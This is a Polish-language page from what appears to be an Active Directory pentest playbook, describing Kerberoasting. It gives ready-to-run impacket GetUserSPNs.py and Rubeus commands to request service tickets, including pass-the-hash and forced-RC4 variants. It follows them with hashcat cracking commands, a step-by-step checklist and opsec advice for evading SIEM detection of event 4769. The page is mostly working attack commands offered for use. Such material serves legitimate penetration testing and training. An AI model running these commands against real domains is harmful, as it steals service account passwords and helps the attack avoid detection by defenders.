---
layout: ad_vector
title: Kerberoasting
slug: kerberoasting
category: kerberos
order: 3
pre_reqs:
  - valid_domain_user_credentials
  - account_with_registered_SPN
  - reachable_kdc_port_88
tools: [impacket, rubeus, hashcat]
chain_inputs: [DOMAIN_FQDN, DC_IP, USER, PASS]
chain_outputs: [NT_HASH_offline, PASS]
progress_total: 8
---

## mechanism

Każdy user zwykły może poprosić KDC o **TGS** dla dowolnego SPN. TGS jest zaszyfrowany **kluczem konta usługi** (NT hash konta które ma SPN — jeśli etype 23/RC4). Wyciągamy bilet, offline crackujemy → dostajemy hasło konta usługi (często słabe, często privileged).

**Hashcat modes:**

- **13100** → TGS-REP etype 23 (RC4-HMAC) — szybko, najczęstsze
- **19700** → TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) — wolniej, jeśli AES-only na koncie
- **19600** → TGS-REP etype 17 (AES128) — rzadko

**Wymuszenie RC4:** w impacket `-e rc4` lub w Rubeus `/tgtdeleg` + `/tickets` na kontach które wspierają RC4.

## impacket — GetUserSPNs.py (bez sesji na hoście, tylko sieć)

<details>
<summary>[+] wyjaśnienie flag</summary>

- `$DOMAIN/$USER:$PASS` → creds do LDAP + Kerberos
- `-request` → od razu poproś o TGS dla każdego SPN znalezionego w LDAP
- `-outputfile spns.hash` → zrzuć do pliku
- `-dc-ip $DC_IP` → wymuś KDC
- `-target-domain` → cross-forest kerberoasting (opcjonalne)
- `-usersfile` → konkretni userzy zamiast całego LDAP scan
- `-request-user $TARGET_USER` → jeden konkretny user
- `-no-preauth $USER` → wymusza flow AS-REQ bez preauth (rare)
- `-hashes LM:NT` → auth NTLM zamiast hasła

</details>

{% include cmd.html env="kali" cmd="GetUserSPNs.py $DOMAIN_FQDN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile spns.hash" %}

{% include cmd.html env="kali" cmd="GetUserSPNs.py $DOMAIN_FQDN/$USER -hashes :$NT_HASH -dc-ip $DC_IP -request -outputfile spns.hash" note="Pass-the-Hash → kerberoast (jeśli tylko NT hash)" %}

{% include cmd.html env="kali" cmd="GetUserSPNs.py $DOMAIN_FQDN/$USER:'$PASS' -dc-ip $DC_IP -request-user $TARGET_USER" note="jeden konkretny konto z SPN" %}

{% include cmd.html env="pwnbox" cmd="impacket-GetUserSPNs $DOMAIN_FQDN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile spns.hash" %}

## rubeus (z sesji na hoście)

<details>
<summary>[+] wyjaśnienie flag</summary>

- `kerberoast` → tryb
- `/nowrap` → jedna linia per hash
- `/format:hashcat` → format do crackera
- `/outfile:` → plik
- `/user:$TARGET_USER` → konkretny user
- `/spn:HTTP/...` → konkretny SPN (bez LDAP scan)
- `/domain:$DOMAIN_FQDN` → cross-domain
- `/tgtdeleg` → używa TGT z current session (obchodzi mitigacje polegające na SPN "roastable")
- `/rc4opsec` → wymuś RC4 tylko dla kont które nie mają wymuszonego AES (mniej hałaśliwe, ale nadal skuteczne)
- `/aes` → AES output (mode 19700) jeśli konto AES-only

</details>

{% include cmd.html env="windows" cmd="Rubeus.exe kerberoast /nowrap /format:hashcat /outfile:spns.hash" %}

{% include cmd.html env="windows" cmd="Rubeus.exe kerberoast /user:$TARGET_USER /nowrap /format:hashcat" %}

{% include cmd.html env="windows" cmd="Rubeus.exe kerberoast /rc4opsec /nowrap /format:hashcat /outfile:spns.hash" note="obchodzi AES-only bez false-positive" %}

{% include cmd.html env="windows" cmd="Rubeus.exe kerberoast /tgtdeleg /nowrap /format:hashcat" note="użyj gdy standard nie działa (S4U2Self detection)" %}

## crack — hashcat

{% include cmd.html env="kali" cmd="hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt --force" %}

{% include cmd.html env="kali" cmd="hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force" note="+30% skuteczność, wolniej" %}

{% include cmd.html env="kali" cmd="hashcat -m 19700 spns.hash /usr/share/wordlists/rockyou.txt --force" note="AES256 TGS-REP" %}

{% include cmd.html env="kali" cmd="hashcat -m 13100 spns.hash --show" %}

## sanity check — enum SPNs bez requesta

{% include cmd.html env="kali" cmd="GetUserSPNs.py $DOMAIN_FQDN/$USER:'$PASS' -dc-ip $DC_IP" note="lista SPN i kont z SPN bez wystawiania TGS-REP w logach" %}

{% include cmd.html env="windows" cmd="setspn.exe -Q */* | findstr /V \"CN=Computers\"" %}

## checklist

- [ ] mam działające `$USER:$PASS` (albo `$USER + $NT_HASH`)
- [ ] wylistowałem SPN-y (`GetUserSPNs.py` bez `-request`)
- [ ] wykonałem `-request -outputfile spns.hash`
- [ ] zidentyfikowałem etype (23 = RC4 = mode 13100, 18 = AES256 = 19700)
- [ ] uruchomiłem hashcat rockyou
- [ ] rerun z regułą OneRuleToRuleThemAll
- [ ] złamane hasła zapisane w kontekście (`$PASS` / notatka jaki konto)
- [ ] sprawdziłem w BloodHound co dane konto ma za edge'y

## opsec

- Standardowy `kerberoast` z Rubeusa wystawia `4769` per SPN — SIEM ma reguły "spike of 4769 with encryption type 0x17 from single user in short time".
- `/rc4opsec` w Rubeus filtruje konta które i tak są RC4-preferable, mniej sygnału.
- Impacket z hosta pentestera wygląda w logach 4769 jako Kerberos service ticket request od `$USER` z **client address = pentester_IP** — mniej detektywne niż z zainfekowanego hosta ale nie zero.
